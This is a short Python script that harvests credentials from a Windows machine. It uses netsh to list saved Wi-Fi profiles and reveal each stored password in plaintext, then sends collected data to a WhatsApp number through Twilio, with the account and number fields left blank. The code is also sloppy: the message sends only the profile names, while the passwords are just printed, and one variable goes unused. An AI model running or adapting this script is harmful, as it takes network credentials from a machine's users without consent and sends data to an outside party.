

import subprocess 


# ///////////FOR SENDING msg TO TWILIO/////////////
from twilio.rest import Client 
 
account_sid = ''  # Your Account SID from twilio.com/console
auth_token = ''  # Your Account Auth token from twilio.com/console
client = Client(account_sid, auth_token) 



def get_wifi_profiles():
    meta_data = subprocess.check_output(["netsh", "wlan", "show", "profiles"])
    data=meta_data.decode("utf-8")
    data = data.split("\n")
    names=[]
    for line in data:
        if "All User Profile     :" in line :
            name = line.split(":")[1]
            names.append(name[1:-1])
            print(names)
            extracted_names=names[-1]
    return names

for name in get_wifi_profiles():
    meta_data = subprocess.check_output(["netsh", "wlan", "show", "profiles" , name ,"key=clear"])
    data=meta_data.decode("utf-8")
    data = data.split("\n")
    names=[]
    for line in data:
        if "Key Content            :" in line :
            password= line.split(":")[1]
    print(name,":",password)    


 
message = client.messages.create( 
                              from_='whatsapp:',   # From a valid Twilio number
                              body=(get_wifi_profiles()),      
                              to='whatsapp:'            # To valid Twilio number
                          ) 
 
print(message.sid)
